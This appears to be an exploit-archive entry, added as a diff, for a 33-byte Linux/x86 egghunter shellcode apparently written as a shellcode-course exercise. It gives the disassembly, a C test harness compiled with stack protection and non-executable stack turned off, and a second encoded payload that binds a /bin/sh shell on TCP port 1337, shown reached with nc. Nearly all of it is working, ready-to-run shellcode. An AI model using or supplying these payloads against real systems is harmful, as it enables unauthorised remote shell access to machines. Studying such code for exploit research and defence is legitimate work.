@@ -1,0 +1,79 @@
+id: 34269
+date: 04/20/2020
+title: Linux/x86 Egghunter / Null-Free Shellcode (33 bytes)
+author: Shubham Singh
+cves: 
+
+/*
+# Title: Linux/x86 - EggHunter + Null-Free Shellcode (33 Bytes)
+# Author: Shubham Singh
+# Tested on: x86 GNU/Linux
+# Shellcode Length: 33 Bytes
+#Student ID: SLAE - 1342
+
+#Description: Null-Free Egg Hunter Shellcode - 33 Bytes
+#file format elf32-i386
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 05                   jmp    8048067 <next_addr>
+
+08048062 <page_allignment>:
+ 8048062:       66 81 c9 ff 0f          or     $0xfff,%cx
+
+08048067 <next_addr>:
+ 8048067:       31 c0                   xor    %eax,%eax
+ 8048069:       41                      inc    %ecx
+ 804806a:       b0 43                   mov    $0x43,%al
+ 804806c:       cd 80                   int    $0x80
+
+0804806e <check_if_efault>:
+ 804806e:       3c f2                   cmp    $0xf2,%al
+ 8048070:       74 f0                   je     8048062 <page_allignment>
+
+08048072 <check_if_egg>:
+ 8048072:       b8 ef be ad de          mov    $0xdeadbeef,%eax
+ 8048077:       89 cf                   mov    %ecx,%edi
+ 8048079:       af                      scas   %es:(%edi),%eax
+ 804807a:       75 eb                   jne    8048067 <next_addr>
+ 804807c:       af                      scas   %es:(%edi),%eax
+ 804807d:       75 e8                   jne    8048067 <next_addr>
+ 804807f:       ff e7                   jmp    *%edi
+
+POC:
+1. ➜  gcc -fno-stack-protector -z execstack shellcode1.c -o shellcode1 
+2. ➜  ./shellcode1
+Length of Egg Hunter Shellcode:  33
+Shellcode length: 102
+
+3. Open new terminal and type
+➜  nc 127.0.0.1 1337
+ls
+bind_shell
+bind_shell.nasm
+bind_shell.o
+egghunter_shellcode
+egghunter_shellcode.nasm
+egghunter_shellcode.o
+
+
+*/
+#include<stdio.h>
+#include<string.h>
+#define EGG "\xef\xbe\xad\xde"
+unsigned char egg_search[] = \
+"\xeb\x05\x66\x81\xc9\xff\x0f\x31\xc0\x41\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8\xef\xbe\xad\xde\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";
+unsigned char code[]= \
+EGG
+EGG
+"\x31\xc0\x31\xdb\x99\xb0\x66\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x43\x52\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+main()
+{
+  printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egg_search));
+  printf("Shellcode length: %d\n", strlen(code));
+  int (*ret)()=(int (*)())egg_search;
+  ret();
+}
+
+#  0day.today [2023-03-22]  #
